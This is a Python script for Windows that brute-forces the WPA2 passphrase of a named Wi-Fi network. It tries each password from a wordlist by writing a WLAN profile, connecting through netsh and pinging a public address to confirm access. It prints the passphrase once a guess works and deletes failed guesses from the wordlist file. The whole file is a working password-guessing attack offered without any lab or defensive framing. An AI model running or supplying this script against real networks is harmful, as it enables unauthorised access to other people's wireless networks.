import time
import subprocess

# ==========================================
#              CONFIGURATION
# ==========================================
SSID     = "NetworkName"
WORDLIST = "C:/path/to/wordlist.txt"
DELAY    = 10  
# ==========================================

XML_TEMPLATE = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig><SSID><name>{ssid}</name></SSID></SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM><security>
        <authEncryption>
            <authentication>WPA2PSK</authentication>
            <encryption>AES</encryption>
            <useOneX>false</useOneX>
        </authEncryption>
        <sharedKey>
            <keyType>passPhrase</keyType>
            <protected>false</protected>
            <keyMaterial>{password}</keyMaterial>
        </sharedKey>
    </security></MSM>
</WLANProfile>"""

def disconnect():
    subprocess.run(["netsh", "wlan", "disconnect"], capture_output=True)
    time.sleep(4)

def has_internet():
    result = subprocess.run(
        ["ping", "-n", "2", "-w", "2000", "8.8.8.8"],
        capture_output=True
    )
    return result.returncode == 0

def try_connect(ssid, password):
    xml = XML_TEMPLATE.format(ssid=ssid, password=password)

    with open("profile.xml", "w", encoding="utf-8") as f:
        f.write(xml)

    disconnect()

    subprocess.run(["netsh", "wlan", "delete", "profile", f"name={ssid}"],
                   capture_output=True)
    subprocess.run(["netsh", "wlan", "add", "profile", "filename=profile.xml"],
                   capture_output=True)
    subprocess.run(["netsh", "wlan", "connect", f"name={ssid}"],
                   capture_output=True)

    time.sleep(DELAY)

    return has_internet()

while True:
    try:
        with open(WORDLIST, "r") as f:
            lines = f.readlines()

        if not lines or not lines[0].strip():
            print("[x] Wordlist is empty — stopping.")
            break

        password = lines[0].strip()
        print(f"[*] Trying : {password}")

        if try_connect(SSID, password):
            print(f"[+] Connected successfully — password : {password}")
            break
        else:
            print(f"[-] Failed — removing first line...")
            with open(WORDLIST, "w") as f:
                f.writelines(lines[1:])
            print(f"[~] {len(lines) - 1} password(s) remaining.")

    except Exception as e:
        print(f"[!] Unexpected error : {e}")
        break